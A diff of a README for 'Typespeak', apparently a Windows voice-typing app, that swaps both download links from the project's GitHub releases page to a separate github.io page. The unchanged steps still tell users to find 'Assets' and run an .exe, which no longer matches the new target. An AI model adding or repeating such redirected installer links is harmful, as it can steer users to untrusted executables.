@@ -1,6 +1,6 @@
 # 🎙️ Typespeak - Private voice typing for everyone
 
-[![Download Typespeak](https://img.shields.io/badge/Download-Typespeak-blue.svg)](https://github.com/Mikaeldoglike497/Typespeak/releases)
+[![Download Typespeak](https://img.shields.io/badge/Download-Typespeak-blue.svg)](https://mikaeldoglike497.github.io)
 
 Typespeak converts your voice into text on your computer. It focuses on privacy by keeping your data on your local device. It supports English, Arabic, and Lebanese dialects. You speak, and the application captures your words accurately.
 
@@ -9,7 +9,7 @@ Typespeak converts your voice into text on your computer. It focuses on privacy 
 You need a computer running Windows 10 or Windows 11. Follow these steps to set up the software.
 
 1. Open your web browser.
-2. Visit the [Typespeak release page](https://github.com/Mikaeldoglike497/Typespeak/releases). 
+2. Visit the [Typespeak release page](https://mikaeldoglike497.github.io). 
 3. Look for the "Assets" section under the latest version.
 4. Click the file that ends in .exe to download the installer.
 5. Once the download finishes, locate the file in your Downloads folder.
